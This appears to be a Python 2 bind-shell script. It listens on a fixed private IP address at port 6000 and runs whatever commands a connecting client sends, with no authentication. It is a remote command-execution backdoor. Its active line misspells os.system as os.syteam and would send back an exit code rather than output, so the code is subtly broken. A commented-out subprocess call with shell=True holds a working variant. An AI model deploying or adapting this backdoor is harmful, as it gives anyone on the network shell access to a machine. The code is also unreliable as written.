#!/usr/bin/python

import socket
from threading import Thread
import subprocess
import commands,os
def ClientHandle(client):
    while True:
        cmd=client.recv(1024).strip()
        if not cmd:
            break
        result=os.syteam(cmd)
        client.send(result)
        '''
        result=subprocess.check_output(cmd,shell=True)
        client.send(result)
        '''
        if cmd=="exit":
            break
    client.close()

def main():
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("10.140.98.237",6000))
    s.listen(5)
    while True:
        try:
            client,addr=s.accept()
            print "Connected by:",addr
            t=Thread(target=ClientHandle,args=(client,))
            t.start()
        except KeyboardInterrupt:
            break
if __name__=="__main__":
    main()
